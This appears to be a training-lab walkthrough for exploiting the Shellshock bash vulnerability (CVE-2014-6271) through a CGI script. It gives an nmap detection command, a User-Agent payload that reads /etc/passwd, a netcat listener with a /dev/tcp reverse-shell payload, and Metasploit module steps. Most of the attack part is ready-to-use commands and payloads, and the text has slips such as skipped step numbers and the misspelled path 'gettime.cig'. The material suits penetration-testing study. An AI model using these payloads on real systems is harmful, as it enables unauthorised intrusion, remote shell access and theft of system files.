# Bash CVE-2014-6271 Vulnerability (Shellshock)

![image1](/Cgi/image1.jpg)

_A CGI script is running on the target server._

__Step 1: Use the Nmap NSE script to check if the server is vulnerable to shellshock attack.__

__Command:__

- __`nmap --script http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" demo.ine.local`__

![image2](/Cgi/image2.jpg)



__Step 2: Modify the User-Agent and inject the malicious payload.__

__Payload:__

- __`() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'`__


![image4](/Cgi/image4.jpg)


__Click on the Send button.__

![image5](/Cgi/image5.jpg)

__Step 6: Start netcat__

command:

__`nc -nvlp 1234`__

__Step 7: use the below payload in user agent__
command:
- __`() { :; }; echo; echo; /bin/bash -c 'bash -i>&/dev/tcp/<yourip>/1234 0>&1'`__

![image10](/Cgi/image10.png)

__you will get reverse shell__




# Method 2 using metasploit framework

__Step 1: Start the `msfconsole`__
__command:__
- __`service postgresql start & msfconsole`__

__Step 2: use below exploit__
__command:__
 - __`use exploit/multi/http/apache_mod_cgi_bash_env_exec`__

__Step 3: set the rhost and TARGETURL__
__command:__
  - __`set RHOSTS <target ip>`__
  - __`set TARGETURI /gettime.cig`__


